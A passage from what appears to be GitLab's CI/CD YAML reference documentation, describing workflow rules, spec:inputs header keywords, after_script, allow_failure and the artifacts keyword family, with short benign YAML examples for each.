You can use [`variables`](https://docs.gitlab.com/ci/yaml/#variables) in `workflow:rules` to define variables for
specific pipeline conditions.

When the condition matches, the variable is created and can be used by all jobs
in the pipeline. If the variable is already defined at the top level as a default variable,
the `workflow` variable takes precedence and overrides the default variable.

**Keyword type**: Global keyword.

**Supported values**: Variable name and value pairs:

- The name can use only numbers, letters, and underscores ( `_`).
- The value must be a string.

**Example of `workflow:rules:variables`**:

YAML Copy to clipboard

```yaml
variables:
  DEPLOY_VARIABLE: "default-deploy"

workflow:
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      variables:
        DEPLOY_VARIABLE: "deploy-production"  # Override globally-defined DEPLOY_VARIABLE
    - if: $CI_COMMIT_BRANCH =~ /feature/
      variables:
        IS_A_FEATURE: "true"                  # Define a new variable.
    - if: $CI_COMMIT_BRANCH                   # Run the pipeline in other cases

job1:
  variables:
    DEPLOY_VARIABLE: "job1-default-deploy"
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      variables:                                   # Override DEPLOY_VARIABLE defined
        DEPLOY_VARIABLE: "job1-deploy-production"  # at the job level.
    - when: on_success                             # Run the job in other cases
  script:
    - echo "Run script with $DEPLOY_VARIABLE as an argument"
    - echo "Run another script if $IS_A_FEATURE exists"

job2:
  script:
    - echo "Run script with $DEPLOY_VARIABLE as an argument"
    - echo "Run another script if $IS_A_FEATURE exists"
```

When the branch is the default branch:

- job1’s `DEPLOY_VARIABLE` is `job1-deploy-production`.
- job2’s `DEPLOY_VARIABLE` is `deploy-production`.

When the branch is `feature`:

- job1’s `DEPLOY_VARIABLE` is `job1-default-deploy`, and `IS_A_FEATURE` is `true`.
- job2’s `DEPLOY_VARIABLE` is `default-deploy`, and `IS_A_FEATURE` is `true`.

When the branch is something else:

- job1’s `DEPLOY_VARIABLE` is `job1-default-deploy`.
- job2’s `DEPLOY_VARIABLE` is `default-deploy`.

**Additional details**:

- `workflow:rules:variables` become [default variables](https://docs.gitlab.com/ci/yaml/#variables) available in all jobs,
including [`trigger`](https://docs.gitlab.com/ci/yaml/#trigger) jobs which forward variables to downstream pipelines by default.
If the downstream pipeline uses the same variable, the [variable is overwritten](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence)
by the upstream variable value. Be sure to either:
  - Use unique variable names in every project’s pipeline configuration, like `PROJECT1_VARIABLE_NAME`.
  - Use [`inherit:variables`](https://docs.gitlab.com/ci/yaml/#inheritvariables) in the trigger job and list the
    exact variables you want to forward to the downstream pipeline.

#### `workflow:rules:auto_cancel` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflowrulesauto_cancel "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/436467) in GitLab 16.8 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_workflow_auto_cancel_on_new_commit`. Disabled by default.
- [Enabled on GitLab.com and GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/434676) in GitLab 16.9.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/434676) in GitLab 16.10. Feature flag `ci_workflow_auto_cancel_on_new_commit` removed.
- `on_job_failure` option for `workflow:rules` [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/23605) in GitLab 16.10 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `auto_cancel_pipeline_on_job_failure`. Disabled by default.
- `on_job_failure` option for `workflow:rules` [generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/433163) in GitLab 16.11. Feature flag `auto_cancel_pipeline_on_job_failure` removed.

Use `workflow:rules:auto_cancel` to configure the behavior of
the [`workflow:auto_cancel:on_new_commit`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_new_commit) or
the [`workflow:auto_cancel:on_job_failure`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_job_failure) features.

**Supported values**:

- `on_new_commit`: [`workflow:auto_cancel:on_new_commit`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_new_commit)
- `on_job_failure`: [`workflow:auto_cancel:on_job_failure`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_job_failure)

**Example of `workflow:rules:auto_cancel`**:

YAML Copy to clipboard

```yaml
workflow:
  auto_cancel:
    on_new_commit: interruptible
    on_job_failure: all
  rules:
    - if: $CI_COMMIT_REF_PROTECTED == 'true'
      auto_cancel:
        on_new_commit: none
        on_job_failure: none
    - when: always                  # Run the pipeline in other cases

test-job1:
  script: sleep 10
  interruptible: false

test-job2:
  script: sleep 10
  interruptible: true
```

In this example, [`workflow:auto_cancel:on_new_commit`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_new_commit)
is set to `interruptible` and [`workflow:auto_cancel:on_job_failure`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_job_failure)
is set to `all` for all jobs by default. But if a pipeline runs for a protected branch,
the rule overrides the default with `on_new_commit: none` and `on_job_failure: none`. For example, if a pipeline
is running for:

- A non-protected branch and a new commit is pushed, `test-job1` continues to run and `test-job2` is canceled.
- A protected branch and a new commit is pushed, both `test-job1` and `test-job2` continue to run.

## Header keywords [Permalink](https://docs.gitlab.com/ci/yaml/\#header-keywords "Permalink")

Some keywords must be defined in a header section of a YAML configuration file.
The header must be at the top of the file, separated from the rest of the configuration
with `---`.

### `spec` [Permalink](https://docs.gitlab.com/ci/yaml/\#spec "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/391331) in GitLab 15.11 as a beta feature.

Add a `spec` section to the header of a YAML file to configure the behavior of a pipeline
when a configuration is added to the pipeline with the `include` keyword.

Specs must be declared at the top of a configuration file, in a header section separated
from the rest of the configuration with `---`.

#### `spec:inputs` [Permalink](https://docs.gitlab.com/ci/yaml/\#specinputs "Permalink")

You can use `spec:inputs` to define [inputs](https://docs.gitlab.com/ci/yaml/inputs/) for the CI/CD configuration.

Use the interpolation format `$[[ inputs.input-id ]]` to reference the values outside of the header section.
Inputs are evaluated and interpolated when the configuration is fetched during pipeline creation.
When using `inputs`, interpolation completes before the configuration is merged
with the contents of the `.gitlab-ci.yml` file.

**Keyword type**: Header keyword. `spec` must be declared at the top of the configuration file,
in a header section.

**Supported values**: A hash of strings representing the expected inputs.

**Example of `spec:inputs`**:

YAML Copy to clipboard

```yaml
spec:
  inputs:
    environment:
    job-stage:
---

scan-website:
  stage: $[[ inputs.job-stage ]]
  script: ./scan-website $[[ inputs.environment ]]
```

**Additional details**:

- Inputs are mandatory unless you use [`spec:inputs:default`](https://docs.gitlab.com/ci/yaml/#specinputsdefault)
to set a default value. Avoid mandatory inputs unless you only use inputs with
[`include:inputs`](https://docs.gitlab.com/ci/yaml/#includeinputs).
- Inputs expect strings unless you use [`spec:inputs:type`](https://docs.gitlab.com/ci/yaml/#specinputstype) to set a
different input type.
- A string containing an interpolation block must not exceed 1 MB.
- The string inside an interpolation block must not exceed 1 KB.
- You can define input values [when running a new pipeline](https://docs.gitlab.com/ci/inputs/#for-a-pipeline).

**Related topics**:

- [Define input parameters with `spec:inputs`](https://docs.gitlab.com/ci/inputs/#define-input-parameters-with-specinputs).

##### `spec:inputs:default` [Permalink](https://docs.gitlab.com/ci/yaml/\#specinputsdefault "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/391331) in GitLab 15.11 as a beta feature.

Inputs are mandatory when included, unless you set a default value with `spec:inputs:default`.

Use `default: ''` to have no default value.

**Keyword type**: Header keyword. `spec` must be declared at the top of the configuration file,
in a header section.

**Supported values**: A string representing the default value, or `''`.

**Example of `spec:inputs:default`**:

YAML Copy to clipboard

```yaml
spec:
  inputs:
    website:
    user:
      default: 'test-user'
    flags:
      default: ''
title: The pipeline configuration would follow...
---
```

In this example:

- `website` is mandatory and must be defined.
- `user` is optional. If not defined, the value is `test-user`.
- `flags` is optional. If not defined, it has no value.

**Additional details**:

- The pipeline fails with a validation error when the input:
  - Uses both `default` and [`options`](https://docs.gitlab.com/ci/yaml/#specinputsoptions), but the default value
    is not one of the listed options.
  - Uses both `default` and `regex`, but the default value does not match the regular expression.
  - Value does not match the [`type`](https://docs.gitlab.com/ci/yaml/#specinputstype).

##### `spec:inputs:description` [Permalink](https://docs.gitlab.com/ci/yaml/\#specinputsdescription "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/415637) in GitLab 16.5.

Use `description` to give a description to a specific input. The description does
not affect the behavior of the input and is only used to help users of the file
understand the input.

**Keyword type**: Header keyword. `spec` must be declared at the top of the configuration file,
in a header section.

**Supported values**: A string representing the description.

**Example of `spec:inputs:description`**:

YAML Copy to clipboard

```yaml
spec:
  inputs:
    flags:
      description: 'Sample description of the `flags` input details.'
title: The pipeline configuration would follow...
---
```

##### `spec:inputs:options` [Permalink](https://docs.gitlab.com/ci/yaml/\#specinputsoptions "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/393401) in GitLab 16.6.

Inputs can use `options` to specify a list of allowed values for an input.
The limit is 50 options per input.

**Keyword type**: Header keyword. `spec` must be declared at the top of the configuration file,
in a header section.

**Supported values**: An array of input options.

**Example of `spec:inputs:options`**:

YAML Copy to clipboard

```yaml
spec:
  inputs:
    environment:
      options:
        - development
        - staging
        - production
title: The pipeline configuration would follow...
---
```

In this example:

- `environment` is mandatory and must be defined with one of the values in the list.

**Additional details**:

- The pipeline fails with a validation error when:
  - The input uses both `options` and [`default`](https://docs.gitlab.com/ci/yaml/#specinputsdefault), but the default value
    is not one of the listed options.
  - Any of the input options do not match the [`type`](https://docs.gitlab.com/ci/yaml/#specinputstype), which can
    be either `string` or `number`, but not `boolean` when using `options`.

##### `spec:inputs:regex` [Permalink](https://docs.gitlab.com/ci/yaml/\#specinputsregex "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/410836) in GitLab 16.5.

Use `spec:inputs:regex` to specify a regular expression that the input must match.

**Keyword type**: Header keyword. `spec` must be declared at the top of the configuration file,
in a header section.

**Supported values**: Must be a regular expression.

**Example of `spec:inputs:regex`**:

YAML Copy to clipboard

```yaml
spec:
  inputs:
    version:
      regex: ^v\d\.\d+(\.\d+)?$
title: The pipeline configuration would follow...
---
```

In this example, inputs of `v1.0` or `v1.2.3` match the regular expression and pass validation.
An input of `v1.A.B` does not match the regular expression and fails validation.

**Additional details**:

- `inputs:regex` can only be used with a [`type`](https://docs.gitlab.com/ci/yaml/#specinputstype) of `string`,
not `number` or `boolean`.
- Do not enclose the regular expression with the `/` character. For example, use `regex.*`,
not `/regex.*/`.
- `inputs:regex` uses [RE2](https://github.com/google/re2/wiki/Syntax) to parse regular expressions.

##### `spec:inputs:type` [Permalink](https://docs.gitlab.com/ci/yaml/\#specinputstype "Permalink")

By default, inputs expect strings. Use `spec:inputs:type` to set a different required
type for inputs.

**Keyword type**: Header keyword. `spec` must be declared at the top of the configuration file,
in a header section.

**Supported values**: Can be one of:

- `array`, to accept an [array](https://docs.gitlab.com/ci/inputs/#array-type) of inputs.
- `string`, to accept string inputs (default when not defined).
- `number`, to only accept numeric inputs.
- `boolean`, to only accept `true` or `false` inputs.

**Example of `spec:inputs:type`**:

YAML Copy to clipboard

```yaml
spec:
  inputs:
    job_name:
    website:
      type: string
    port:
      type: number
    available:
      type: boolean
    array_input:
      type: array
title: The pipeline configuration would follow...
---
```

## Job keywords [Permalink](https://docs.gitlab.com/ci/yaml/\#job-keywords "Permalink")

The following topics explain how to use keywords to configure CI/CD pipelines.

### `after_script` [Permalink](https://docs.gitlab.com/ci/yaml/\#after_script "Permalink")

History

- Running `after_script` commands for canceled jobs [introduced](https://gitlab.com/groups/gitlab-org/-/epics/10158) in GitLab 17.0.

Use `after_script` to define an array of commands to run last, after a job’s `before_script` and
`script` sections complete. `after_script` commands also run when:

- The job is canceled while the `before_script` or `script` sections are still running.
- The job fails with failure type of `script_failure`, but not [other failure types](https://docs.gitlab.com/ci/yaml/#retrywhen).

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: An array including:

- Single line commands.
- Long commands [split over multiple lines](https://docs.gitlab.com/ci/yaml/script/#split-long-commands).
- [YAML anchors](https://docs.gitlab.com/ci/yaml/yaml_optimization/#yaml-anchors-for-scripts).

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `after_script`**:

YAML Copy to clipboard

```yaml
job:
  script:
    - echo "An example script section."
  after_script:
    - echo "Execute this command after the `script` section completes."
```

**Additional details**:

Scripts you specify in `after_script` execute in a new shell, separate from any
`before_script` or `script` commands. As a result, they:

- Have the current working directory set back to the default (according to the [variables which define how the runner processes Git requests](https://docs.gitlab.com/ci/runners/configure_runners/#configure-runner-behavior-with-variables)).
- Don’t have access to changes done by commands defined in the `before_script` or `script`,
including:
  - Command aliases and variables exported in `script` scripts.
  - Changes outside of the working tree (depending on the runner executor), like
    software installed by a `before_script` or `script` script.
- Have a separate timeout. For GitLab Runner 16.4 and later, this defaults to 5 minutes, and can be configured with the
[`RUNNER_AFTER_SCRIPT_TIMEOUT`](https://docs.gitlab.com/ci/runners/configure_runners/#set-script-and-after_script-timeouts) variable.
In GitLab 16.3 and earlier, the timeout is hard-coded to 5 minutes.
- Don’t affect the job’s exit code. If the `script` section succeeds and the
`after_script` times out or fails, the job exits with code `0` ( `Job Succeeded`).
- There is a known issue with using [CI/CD job tokens](https://docs.gitlab.com/ci/jobs/ci_job_token/) with `after_script`.
You can use a job token for authentication in `after_script` commands, but the token
immediately becomes invalid if the job is canceled. See [issue](https://gitlab.com/gitlab-org/gitlab/-/issues/473376)
for more details.

For jobs that time out:

- `after_script` commands do not execute by default.
- You can [configure timeout values](https://docs.gitlab.com/ci/runners/configure_runners/#ensuring-after_script-execution) to ensure `after_script` runs by setting appropriate `RUNNER_SCRIPT_TIMEOUT` and `RUNNER_AFTER_SCRIPT_TIMEOUT` values that don’t exceed the job’s timeout.

**Related topics**:

- [Use `after_script` with `default`](https://docs.gitlab.com/ci/yaml/script/#set-a-default-before_script-or-after_script-for-all-jobs)
to define a default array of commands that should run after all jobs.
- You can configure a job to [skip `after_script` commands if the job is canceled](https://docs.gitlab.com/ci/yaml/script/#skip-after_script-commands-if-a-job-is-canceled).
- You can [ignore non-zero exit codes](https://docs.gitlab.com/ci/yaml/script/#ignore-non-zero-exit-codes).
- [Use color codes with `after_script`](https://docs.gitlab.com/ci/yaml/script/#add-color-codes-to-script-output)
to make job logs easier to review.
- [Create custom collapsible sections](https://docs.gitlab.com/ci/jobs/job_logs/#custom-collapsible-sections)
to simplify job log output.
- You can [ignore errors in `after_script`](https://docs.gitlab.com/ci/runners/configure_runners/#ignore-errors-in-after_script).

### `allow_failure` [Permalink](https://docs.gitlab.com/ci/yaml/\#allow_failure "Permalink")

Use `allow_failure` to determine whether a pipeline should continue running when a job fails.

- To let the pipeline continue running subsequent jobs, use `allow_failure: true`.
- To stop the pipeline from running subsequent jobs, use `allow_failure: false`.

When jobs are allowed to fail ( `allow_failure: true`) an orange warning (
status\_warning)
indicates that a job failed. However, the pipeline is successful and the associated commit
is marked as passed with no warnings.

This same warning is displayed when:

- All other jobs in the stage are successful.
- All other jobs in the pipeline are successful.

The default value for `allow_failure` is:

- `true` for [manual jobs](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually).
- `false` for jobs that use `when: manual` inside [`rules`](https://docs.gitlab.com/ci/yaml/#rules).
- `false` in all other cases.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `true` or `false`.

**Example of `allow_failure`**:

YAML Copy to clipboard

```yaml
job1:
  stage: test
  script:
    - execute_script_1

job2:
  stage: test
  script:
    - execute_script_2
  allow_failure: true

job3:
  stage: deploy
  script:
    - deploy_to_staging
  environment: staging
```

In this example, `job1` and `job2` run in parallel:

- If `job1` fails, jobs in the `deploy` stage do not start.
- If `job2` fails, jobs in the `deploy` stage can still start.

**Additional details**:

- You can use `allow_failure` as a subkey of [`rules`](https://docs.gitlab.com/ci/yaml/#rulesallow_failure).
- If `allow_failure: true` is set, the job is always considered successful, and later jobs with [`when: on_failure`](https://docs.gitlab.com/ci/yaml/#when) don’t start if this job fails.
- You can use `allow_failure: false` with a manual job to create a [blocking manual job](https://docs.gitlab.com/ci/jobs/job_control/#types-of-manual-jobs).
A blocked pipeline does not run any jobs in later stages until the manual job
is started and completes successfully.

#### `allow_failure:exit_codes` [Permalink](https://docs.gitlab.com/ci/yaml/\#allow_failureexit_codes "Permalink")

Use `allow_failure:exit_codes` to control when a job should be
allowed to fail. The job is `allow_failure: true` for any of the listed exit codes,
and `allow_failure` false for any other exit code.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A single exit code.
- An array of exit codes.

**Example of `allow_failure`**:

YAML Copy to clipboard

```yaml
test_job_1:
  script:
    - echo "Run a script that results in exit code 1. This job fails."
    - exit 1
  allow_failure:
    exit_codes: 137

test_job_2:
  script:
    - echo "Run a script that results in exit code 137. This job is allowed to fail."
    - exit 137
  allow_failure:
    exit_codes:
      - 137
      - 255
```

### `artifacts` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifacts "Permalink")

History

- [Updated](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/5543) in GitLab Runner 18.1. During the caching process,
`symlinks` are no longer followed, which happened in some edge cases with previous GitLab Runner versions.

Use `artifacts` to specify which files to save as [job artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/).
Job artifacts are a list of files and directories that are
attached to the job when it [succeeds, fails, or always](https://docs.gitlab.com/ci/yaml/#artifactswhen).

The artifacts are sent to GitLab after the job finishes. They are
available for download in the GitLab UI if the size is smaller than the
[maximum artifact size](https://docs.gitlab.com/user/gitlab_com/#cicd).

By default, jobs in later stages automatically download all the artifacts created
by jobs in earlier stages. You can control artifact download behavior in jobs with
[`dependencies`](https://docs.gitlab.com/ci/yaml/#dependencies).

When using the [`needs`](https://docs.gitlab.com/ci/yaml/#needs) keyword, jobs can only download
artifacts from the jobs defined in the `needs` configuration.

Job artifacts are only collected for successful jobs by default, and
artifacts are restored after [caches](https://docs.gitlab.com/ci/yaml/#cache).

[Read more about artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/).

#### `artifacts:paths` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactspaths "Permalink")

Paths are relative to the project directory ( `$CI_PROJECT_DIR`) and can’t directly
link outside it.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- An array of file paths, relative to the project directory.
- You can use Wildcards that use [glob](https://en.wikipedia.org/wiki/Glob_%28programming%29) patterns and [`doublestar.Glob`](https://pkg.go.dev/github.com/bmatcuk/doublestar@v1.2.2?tab=doc#Match) patterns.
- For [GitLab Pages job](https://docs.gitlab.com/ci/yaml/#pages):
  - In [GitLab 17.10 and later](https://gitlab.com/gitlab-org/gitlab/-/issues/428018),
    the [`pages.publish`](https://docs.gitlab.com/ci/yaml/#pagespublish) path is automatically appended to `artifacts:paths`,
    so you don’t need to specify it again.
  - In [GitLab 17.10 and later](https://gitlab.com/gitlab-org/gitlab/-/issues/428018),
    when the [`pages.publish`](https://docs.gitlab.com/ci/yaml/#pagespublish) path is not specified,
    the `public` directory is automatically appended to `artifacts:paths`.

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `artifacts:paths`**:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    paths:
      - binaries/
      - .config
```

This example creates an artifact with `.config` and all the files in the `binaries` directory.

**Additional details**:

- If not used with [`artifacts:name`](https://docs.gitlab.com/ci/yaml/#artifactsname), the artifacts file
is named `artifacts`, which becomes `artifacts.zip` when downloaded.

**Related topics**:

- To restrict which jobs a specific job fetches artifacts from, see [`dependencies`](https://docs.gitlab.com/ci/yaml/#dependencies).
- [Create job artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/#create-job-artifacts).

#### `artifacts:exclude` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsexclude "Permalink")

Use `artifacts:exclude` to prevent files from being added to an artifacts archive.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- An array of file paths, relative to the project directory.
- You can use Wildcards that use [glob](https://en.wikipedia.org/wiki/Glob_%28programming%29) or
[`doublestar.PathMatch`](https://pkg.go.dev/github.com/bmatcuk/doublestar@v1.2.2?tab=doc#PathMatch) patterns.

**Example of `artifacts:exclude`**:

YAML Copy to clipboard

```yaml
artifacts:
  paths:
    - binaries/
  exclude:
    - binaries/**/*.o
```

This example stores all files in `binaries/`, but not `*.o` files located in
subdirectories of `binaries/`.

**Additional details**:

- `artifacts:exclude` paths are not searched recursively.
- Files matched by [`artifacts:untracked`](https://docs.gitlab.com/ci/yaml/#artifactsuntracked) can be excluded using
`artifacts:exclude` too.

**Related topics**:

- [Exclude files from job artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/#without-excluded-files).

#### `artifacts:expire_in` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsexpire_in "Permalink")

Use `expire_in` to specify how long [job artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/) are stored before
they expire and are deleted. The `expire_in` setting does not affect:

- Artifacts from the latest job, unless keeping the latest job artifacts is disabled
[at the project level](https://docs.gitlab.com/ci/jobs/job_artifacts/#keep-artifacts-from-most-recent-successful-jobs)
or [instance-wide](https://docs.gitlab.com/administration/settings/continuous_integration/#keep-artifacts-from-latest-successful-pipelines).

After their expiry, artifacts are deleted hourly by default (using a cron job), and are not
accessible anymore.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: The expiry time. If no unit is provided, the time is in seconds.
Valid values include:

- `'42'`
- `42 seconds`
- `3 mins 4 sec`
- `2 hrs 20 min`
- `2h20min`
- `6 mos 1 day`
- `47 yrs 6 mos and 4d`
- `3 weeks and 2 days`
- `never`

**Example of `artifacts:expire_in`**:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    expire_in: 1 week
```

**Additional details**:

- The expiration time period begins when the artifact is uploaded and stored on GitLab.
If the expiry time is not defined, it defaults to the [instance wide setting](https://docs.gitlab.com/administration/settings/continuous_integration/#set-default-artifacts-expiration).
- To override the expiration date and protect artifacts from being automatically deleted:
  - Select **Keep** on the job page.
  - Set the value of `expire_in` to `never`.
- If the expiry time is too short, jobs in later stages of a long pipeline might try to fetch
expired artifacts from earlier jobs. If the artifacts are expired, jobs that try to fetch
them fail with a [`could not retrieve the needed artifacts` error](https://docs.gitlab.com/ci/jobs/job_artifacts_troubleshooting/#error-message-this-job-could-not-start-because-it-could-not-retrieve-the-needed-artifacts).
Set the expiry time to be longer, or use [`dependencies`](https://docs.gitlab.com/ci/yaml/#dependencies) in later jobs
to ensure they don’t try to fetch expired artifacts.
- `artifacts:expire_in` doesn’t affect GitLab Pages deployments. To configure Pages deployments’ expiry, use [`pages.expire_in`](https://docs.gitlab.com/ci/yaml/#pagesexpire_in).

#### `artifacts:expose_as` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsexpose_as "Permalink")

Use the `artifacts:expose_as` keyword to
[expose job artifacts in the merge request UI](https://docs.gitlab.com/ci/jobs/job_artifacts/#link-to-job-artifacts-in-the-merge-request-ui).

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- The name to display in the merge request UI for the artifacts download link.
Must be combined with [`artifacts:paths`](https://docs.gitlab.com/ci/yaml/#artifactspaths).

**Example of `artifacts:expose_as`**:

YAML Copy to clipboard

```yaml
test:
  script: ["echo 'test' > file.txt"]
  artifacts:
    expose_as: 'artifact 1'
    paths: ['file.txt']
```

**Additional details**:

- Artifacts are saved, but do not display in the UI if the `artifacts:paths` values:
  - Use [CI/CD variables](https://docs.gitlab.com/ci/variables/).
  - Define a directory, but do not end with `/`. For example, `directory/` works with `artifacts:expose_as`,
    but `directory` does not.
  - Start with `./`. For example, `file` works with `artifacts:expose_as`, but `./file` does not.
- A maximum of 10 job artifacts per merge request can be exposed.
- Glob patterns are unsupported.
- If a directory is specified and there is more than one file in the directory,
the link is to the job [artifacts browser](https://docs.gitlab.com/ci/jobs/job_artifacts/#download-job-artifacts).
- If [GitLab Pages](https://docs.gitlab.com/administration/pages/) is enabled, GitLab automatically
renders the artifacts when the artifacts is a single file with one of these extensions:
  - `.html` or `.htm`
  - `.txt`
  - `.json`
  - `.xml`
  - `.log`

**Related topics**:

- [Expose job artifacts in the merge request UI](https://docs.gitlab.com/ci/jobs/job_artifacts/#link-to-job-artifacts-in-the-merge-request-ui).

#### `artifacts:name` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsname "Permalink")

Use the `artifacts:name` keyword to define the name of the created artifacts
archive. You can specify a unique name for every archive.

If not defined, the default name is `artifacts`, which becomes `artifacts.zip` when downloaded.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- The name of the artifacts archive. CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).
Must be combined with [`artifacts:paths`](https://docs.gitlab.com/ci/yaml/#artifactspaths).

**Example of `artifacts:name`**:

To create an archive with a name of the current job:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    name: "job1-artifacts-file"
    paths:
      - binaries/
```

**Related topics**:

- [Use CI/CD variables to define the artifacts configuration](https://docs.gitlab.com/ci/jobs/job_artifacts/#with-variable-expansion)

#### `artifacts:public` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactspublic "Permalink")

History

- [Updated](https://gitlab.com/gitlab-org/gitlab/-/issues/322454) in GitLab 15.10. Artifacts created with `artifacts:public` before 15.10 are not guaranteed to remain private after this update.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/294503) in GitLab 16.7. Feature flag `non_public_artifacts` removed.

`artifacts:public` is now superseded by [`artifacts:access`](https://docs.gitlab.com/ci/yaml/#artifactsaccess) which
has more options.

Use `artifacts:public` to determine whether the job artifacts should be
publicly available.

When `artifacts:public` is `true` (default), the artifacts in
public pipelines are available for download by anonymous, guest, and reporter users.

To deny read access to artifacts in public
pipelines for anonymous, guest, and reporter users, set `artifacts:public` to `false`:

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `true` (default if not defined) or `false`.

**Example of `artifacts:public`**:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    public: false
```

#### `artifacts:access` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsaccess "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/145206) in GitLab 16.11.

Use `artifacts:access` to determine who can access the job artifacts from the GitLab UI
or API. This option does not prevent you from forwarding artifacts to downstream pipelines.

You cannot use [`artifacts:public`](https://docs.gitlab.com/ci/yaml/#artifactspublic) and `artifacts:access` in the same job.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `all` (default): Artifacts in a job in public pipelines are available for download by anyone,
including anonymous, guest, and reporter users.
- `developer`: Artifacts in the job are only available for download by users with the Developer role or higher.
- `none`: Artifacts in the job are not available for download by anyone.

**Example of `artifacts:access`**:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    access: 'developer'
```

**Additional details**:

- `artifacts:access` affects all [`artifacts:reports`](https://docs.gitlab.com/ci/yaml/#artifactsreports) too,
so you can also restrict access to [artifacts for reports](https://docs.gitlab.com/ci/yaml/artifacts_reports/).

#### `artifacts:reports` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsreports "Permalink")

Use [`artifacts:reports`](https://docs.gitlab.com/ci/yaml/artifacts_reports/) to collect artifacts generated by
included templates in jobs.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- See list of available [artifacts reports types](https://docs.gitlab.com/ci/yaml/artifacts_reports/).

**Example of `artifacts:reports`**:

YAML Copy to clipboard

```yaml
rspec:
  stage: test
  script:
    - bundle install
    - rspec --format RspecJunitFormatter --out rspec.xml
  artifacts:
    reports:
      junit: rspec.xml
```

**Additional details**:

- Combining reports in parent pipelines using [artifacts from child pipelines](https://docs.gitlab.com/ci/yaml/#needspipelinejob) is
not supported. Track progress on adding support in [this issue](https://gitlab.com/gitlab-org/gitlab/-/issues/215725).
- To be able to browse and download the report output files, include the [`artifacts:paths`](https://docs.gitlab.com/ci/yaml/#artifactspaths) keyword. This uploads and stores the artifact twice.
- Artifacts created for `artifacts: reports` are always uploaded, regardless of the job results (success or failure).
You can use [`artifacts:expire_in`](https://docs.gitlab.com/ci/yaml/#artifactsexpire_in) to set an expiration
date for the artifacts.

#### `artifacts:untracked` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsuntracked "Permalink")

Use `artifacts:untracked` to add all Git untracked files as artifacts (along
with the paths defined in `artifacts:paths`). `artifacts:untracked` ignores configuration
in the repository’s `.gitignore`, so matching artifacts in `.gitignore` are included.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `true` or `false` (default if not defined).

**Example of `artifacts:untracked`**:

Save all Git untracked files:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    untracked: true
```

**Related topics**:

- [Add untracked files to artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/#with-untracked-files).

